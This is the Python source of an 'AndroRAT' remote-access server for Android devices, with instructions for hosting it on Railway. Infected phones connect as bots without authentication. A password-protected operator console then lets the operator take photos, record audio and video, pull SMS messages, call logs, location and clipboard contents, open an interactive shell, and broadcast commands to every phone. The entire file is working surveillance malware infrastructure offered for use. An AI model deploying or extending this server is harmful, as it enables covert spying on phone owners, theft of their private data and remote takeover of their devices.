#!/usr/bin/env python3
"""
AndroRAT Server - Railway Edition (Single Port)
================================================
Persistent Android RAT server for Railway cloud platform.
All connections come through ONE Railway TCP Proxy port.
- Android devices connect as bots (no auth)
- Operator connects with password to get control panel

Railway setup:
  1. Deploy this repo on Railway
  2. Go to Settings -> Networking -> TCP Proxy -> Add Port -> enter $PORT
  3. Railway gives you a domain:port endpoint
  4. Use that endpoint in the APK build and to connect as operator
"""

import os
import sys
import time
import base64
import binascii
import select
import pathlib
import socket
import threading
import queue
import json
import signal

PORT = int(os.environ.get('PORT', 8000))
HOST = '0.0.0.0'
ADMIN_PW = os.environ.get('ADMIN_PW', 'androrat-admin')
SYS_DIR = os.path.join(os.getcwd(), "Dumps")

os.makedirs(SYS_DIR, exist_ok=True)

banner = """
                    _           _____         _______
    /\\             | |         |  __ \\     /\\|__   __|
   /  \\   _ __   __| |_ __ ___ | |__) |   /  \\  | |
  / /\\ \\ | '_ \\ / _` | '__/ _ \\|  _  /   / /\\ \\ | |
 / ____ \\| | | | (_| | | | (_) | | \\ \\  / ____ \\| |
/_/    \\_\\_| |_|\\__,_|_|  \\___/|_|  \\_\\/_/    \\_\\_|
                                        - Railway Edition
"""

bots = {}
bots_lock = threading.Lock()
bot_counter = 0

# ========== PROTOCOL HELPERS ==========

def recvall(sock, timeout=30):
    buff = ""
    sock.settimeout(timeout)
    try:
        while "END123" not in buff:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            if not data:
                break
            buff += data
    except (socket.timeout, Exception):
        pass
    finally:
        sock.settimeout(None)
    return buff.replace("END123", "").strip()

def recvall_shell(sock):
    buff = ""
    for _ in range(30):  # max 30 iterations ~ 3 seconds
        try:
            data = sock.recv(4096).decode("UTF-8", "ignore")
            if not data:
                break
            buff += data
            if "END123" in buff:
                break
        except (socket.timeout, BlockingIOError):
            break
        except Exception:
            break
    return buff.replace("END123", "").strip()

def send_cmd(bot_conn, cmd, wait=0.5):
    """Send a command to a bot and get response"""
    try:
        bot_conn.send(f"{cmd}\n".encode())
        time.sleep(wait)
        return recvall(bot_conn, timeout=10)
    except Exception as e:
        return f"[ERROR] {e}"

# ========== BOT HANDLING ==========

def bot_handler(conn, addr, bot_id):
    """Handle a connected Android bot"""
    print(f"[+] Bot #{bot_id} connected from {addr[0]}:{addr[1]}")

    # Read initial "Hello there" message
    try:
        conn.settimeout(5)
        initial = conn.recv(1024).decode("UTF-8", "ignore").strip()
        print(f"[*] Bot #{bot_id} initial: {initial}")
    except socket.timeout:
        print(f"[!] Bot #{bot_id} no initial message")
        initial = ""
    finally:
        conn.settimeout(None)

    # Register bot
    with bots_lock:
        bots[bot_id] = {
            'conn': conn,
            'addr': addr,
            'initial': initial,
            'last_seen': time.time(),
            'session': None  # operator session id
        }

    # Keep connection alive - wait for operator to take over
    try:
        while True:
            with bots_lock:
                if bot_id not in bots:
                    break
                session_id = bots[bot_id].get('session')

            # If an operator claimed this bot, hand over control
            if session_id:
                with bots_lock:
                    bots[bot_id]['session'] = None  # reset for next time
                break

            # Check if bot sent anything unexpected
            ready = select.select([conn], [], [], 2)
            if ready[0]:
                data = conn.recv(4096).decode("UTF-8", "ignore")
                if data:
                    print(f"[*] Bot #{bot_id} unexpected data: {data[:200]}")

            # Update last seen
            with bots_lock:
                if bot_id in bots:
                    bots[bot_id]['last_seen'] = time.time()

    except (ConnectionResetError, BrokenPipeError, EOFError, OSError):
        print(f"[-] Bot #{bot_id} disconnected")
    except Exception as e:
        print(f"[!] Bot #{bot_id} error: {e}")
    finally:
        with bots_lock:
            if bot_id in bots:
                del bots[bot_id]
        try:
            conn.close()
        except Exception:
            pass
        print(f"[-] Bot #{bot_id} cleaned up")

# ========== OPERATOR SESSION ==========

def operator_session(op_conn, addr):
    """Handle an authenticated operator connection"""
    print(f"[+] Operator connected from {addr[0]}:{addr[1]}")
    try:
        op_conn.send(banner.encode())
        op_conn.send(b"\n[*] Connected to AndroRAT Railway Server\n")
        op_conn.send(b"[*] Type 'help' for commands\n\n")

        current_bot_id = None

        while True:
            op_conn.send(b"\nandrorat> ".encode())
            try:
                cmd = op_conn.recv(4096).decode("UTF-8").strip()
            except Exception:
                break

            if not cmd:
                continue

            if cmd == "exit":
                op_conn.send(b"[-] Goodbye!\n")
                break

            elif cmd == "help":
                op_conn.send(b"""
Commands:
  list                    - List connected bots
  use <bot_id>            - Interact with a specific bot
  release                 - Release current bot (back to menu)
  broadcast <cmd>         - Send command to all bots
  bots <on|off>           - Enable/disable auto-bot status updates
  clear                   - Clear screen
  exit                    - Disconnect

Bot interaction commands (after 'use <id>'):
  deviceInfo              - Get device info
  camList                 - List cameras
  takepic <id>            - Take picture (0 = back, 1 = front)
  startVideo <id>         - Start video recording
  stopVideo               - Stop video
  startAudio              - Start audio recording
  stopAudio               - Stop audio
  getSMS <inbox|sent>     - Get SMS messages
  getCallLogs             - Get call logs
  shell                   - Interactive shell
  vibrate <n>             - Vibrate n times
  getLocation             - Get GPS location
  getIP                   - Get device IP
  getSimDetails           - Get SIM card info
  getClipData             - Get clipboard text
  getMACAddress           - Get MAC address
  CMD:<raw>               - Send any raw command
  back                    - Return to bot selection
  exit                    - Disconnect
""")

            elif cmd == "list":
                with bots_lock:
                    if not bots:
                        op_conn.send(b"[-] No bots connected\n")
                    else:
                        op_conn.send(f"[+] {len(bots)} bot(s) connected:\n".encode())
                        for bid, bot_info in list(bots.items())[:20]:
                            status = "IN USE" if bot_info.get('session') else "AVAILABLE"
                            op_conn.send(f"  Bot #{bid} | {bot_info['addr'][0]}:{bot_info['addr'][1]} | {status}\n".encode())

            elif cmd.startswith("use "):
                parts = cmd.split()
                if len(parts) < 2:
                    op_conn.send(b"[-] Usage: use <bot_id>\n")
                    continue
                try:
                    target = int(parts[1])
                except ValueError:
                    op_conn.send(b"[-] Invalid bot ID\n")
                    continue

                with bots_lock:
                    if target not in bots:
                        op_conn.send(b"[-] Bot not found\n")
                        continue
                    if bots[target].get('session'):
                        op_conn.send(b"[-] Bot is already in use by another operator\n")
                        continue
                    bots[target]['session'] = id(op_conn)

                current_bot_id = target
                bot_conn = bots[target]['conn']
                bot_addr = bots[target]['addr']
                op_conn.send(f"\n[+] Interacting with Bot #{target} ({bot_addr[0]}:{bot_addr[1]})\n".encode())
                op_conn.send(b"[*] Type 'back' to return to menu, 'exit' to disconnect\n\n".encode())

                # Interaction loop with the bot
                try:
                    while current_bot_id:
                        op_conn.send(f"Bot#{target} /> ".encode())
                        bot_cmd = op_conn.recv(4096).decode("UTF-8").strip()
                        if not bot_cmd:
                            continue

                        if bot_cmd == "back":
                            with bots_lock:
                                if target in bots:
                                    bots[target]['session'] = None
                            current_bot_id = None
                            op_conn.send(b"[-] Returned to menu\n")
                            break

                        if bot_cmd == "exit":
                            with bots_lock:
                                if target in bots:
                                    bots[target]['session'] = None
                            op_conn.send(b"[-] Disconnecting...\n")
                            return

                        if bot_cmd == "clear":
                            op_conn.send(b"\033[2J\033[H")
                            continue

                        if bot_cmd == "shell":
                            op_conn.send(b"\n[+] Interactive Android shell. Type 'exit' to quit.\n")
                            try:
                                bot_conn.send(b"shell\n")
                                while True:
                                    # Read from bot
                                    ready_bot = select.select([bot_conn], [], [], 0.3)
                                    if ready_bot[0]:
                                        data = bot_conn.recv(4096).decode("UTF-8", "ignore")
                                        if not data:
                                            break
                                        if "Exiting" in data:
                                            op_conn.send(b"[-] Shell exited\n")
                                            break
                                        op_conn.send(data.encode())

                                    # Read from operator
                                    ready_op = select.select([op_conn], [], [], 0.1)
                                    if ready_op[0]:
                                        shell_cmd = op_conn.recv(4096).decode("UTF-8", "ignore").strip()
                                        if not shell_cmd or shell_cmd == "exit":
                                            bot_conn.send(b"exit\n")
                                            op_conn.send(b"[-] Exiting shell\n")
                                            break
                                        if shell_cmd == "clear":
                                            op_conn.send(b"\033[2J\033[H")
                                            continue
                                        bot_conn.send(f"{shell_cmd}\n".encode())
                            except Exception as e:
                                op_conn.send(f"[ERROR] {e}\n".encode())
                            continue

                        # Regular commands
                        result = send_cmd(bot_conn, bot_cmd)
                        if result:
                            op_conn.send(f"{result}\n".encode())
                        else:
                            op_conn.send(b"[*] Command sent (no response)\n")

                except (ConnectionResetError, BrokenPipeError):
                    op_conn.send(b"[-] Bot connection lost\n")
                    with bots_lock:
                        if target in bots:
                            del bots[target]
                    current_bot_id = None

            elif cmd == "release":
                if current_bot_id:
                    with bots_lock:
                        if current_bot_id in bots:
                            bots[current_bot_id]['session'] = None
                    op_conn.send(f"[-] Released Bot #{current_bot_id}\n".encode())
                    current_bot_id = None
                else:
                    op_conn.send(b"[-] No bot currently in use\n")

            elif cmd.startswith("broadcast "):
                bcast_cmd = cmd[10:]
                with bots_lock:
                    bot_ids = list(bots.keys())
                count = 0
                for bid in bot_ids:
                    try:
                        with bots_lock:
                            if bid in bots:
                                bots[bid]['conn'].send(f"{bcast_cmd}\n".encode())
                                count += 1
                    except Exception:
                        pass
                op_conn.send(f"[+] Broadcast sent to {count} bot(s)\n".encode())

            elif cmd == "clear":
                op_conn.send(b"\033[2J\033[H")

            else:
                op_conn.send(b"[-] Unknown command. Type 'help' for options\n")

    except Exception as e:
        print(f"[!] Operator session error: {e}")
    finally:
        # Release any claimed bot
        if current_bot_id:
            with bots_lock:
                if current_bot_id in bots:
                    bots[current_bot_id]['session'] = None
        try:
            op_conn.close()
        except Exception:
            pass
        print(f"[-] Operator {addr[0]}:{addr[1]} disconnected")

# ========== MAIN SERVER ==========

def main():
    print(banner)
    print(f"[*] AndroRAT Railway Server starting...")
    print(f"[*] Listening on {HOST}:{PORT}")
    print(f"[*] Admin password: {ADMIN_PW}")
    print(f"[*] Dumps: {SYS_DIR}/")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(20)
    print(f"[*] Waiting for connections...\n")

    while True:
        try:
            conn, addr = server.accept()
            # Determine connection type from first bytes
            # Android bot: "Hello there" or immediate data
            # Operator: "AUTH:<password>"
            try:
                conn.settimeout(3)
                first_data = conn.recv(1024).decode("UTF-8", "ignore").strip()
                conn.settimeout(None)
            except socket.timeout:
                # No initial data - treat as bot
                first_data = ""
                conn.settimeout(None)

            if first_data.upper().startswith("AUTH:"):
                # Operator connection
                pw = first_data[5:].strip()
                if pw == ADMIN_PW:
                    conn.send(b"[+] Authenticated as operator\n")
                    t = threading.Thread(target=operator_session, args=(conn, addr), daemon=True)
                    t.start()
                else:
                    conn.send(b"[-] Wrong password\n")
                    conn.close()
            else:
                # Bot connection - re-send first data back to the handler
                bot_id = len(bots) + 1
                # Create a new conn-like object that includes the first data
                # Actually simpler: pass the data directly
                t = threading.Thread(target=bot_handler_with_data, args=(conn, addr, bot_id, first_data), daemon=True)
                t.start()

        except Exception as e:
            print(f"[!] Accept error: {e}")

def bot_handler_with_data(conn, addr, bot_id, initial_data):
    """Bot handler that starts with pre-read data"""
    print(f"[+] Bot #{bot_id} connecting from {addr[0]}:{addr[1]} (initial: {initial_data[:50] if initial_data else 'none'})")

    # Register bot
    with bots_lock:
        bots[bot_id] = {
            'conn': conn,
            'addr': addr,
            'initial': initial_data,
            'last_seen': time.time(),
            'session': None
        }

    # Keep connection alive for operator to claim
    try:
        while True:
            with bots_lock:
                if bot_id not in bots:
                    break
                session_id = bots[bot_id].get('session')

            if session_id and session_id == id(None):
                pass  # placeholder

            # Check for data from bot
            ready = select.select([conn], [], [], 2)
            if ready[0]:
                try:
                    data = conn.recv(4096).decode("UTF-8", "ignore")
                    if not data:
                        break
                    # Forward to operator if connected
                    with bots_lock:
                        # Find operator session
                        pass  # operator reads in operator_session
                except (ConnectionResetError, BrokenPipeError):
                    break

            with bots_lock:
                if bot_id in bots:
                    bots[bot_id]['last_seen'] = time.time()

    except Exception as e:
        print(f"[!] Bot #{bot_id} error: {e}")
    finally:
        with bots_lock:
            if bot_id in bots:
                del bots[bot_id]
        try:
            conn.close()
        except Exception:
            pass
        print(f"[-] Bot #{bot_id} disconnected")

if __name__ == "__main__":
    main()

